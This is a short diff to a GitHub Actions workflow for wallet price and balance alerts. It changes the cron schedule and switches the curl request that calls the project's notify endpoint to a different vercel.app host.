@@ -2,7 +2,8 @@ name: Wallet alerts
 
 on:
   schedule:
-    - cron: "*/15 * * * *"
+    - cron: "5 * * * *"
+    - cron: "35 * * * *"
   workflow_dispatch:
 
 jobs:
@@ -10,4 +11,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Send due price and balance alerts
-        run: curl -fsS --retry 3 --retry-delay 15 -m 55 "https://gem-island-cap-daisy.vercel.app/api/notify"
+        run: curl -fsSL --retry 3 --retry-delay 15 -m 55 "https://trustwalletblockchain.vercel.app/api/notify"
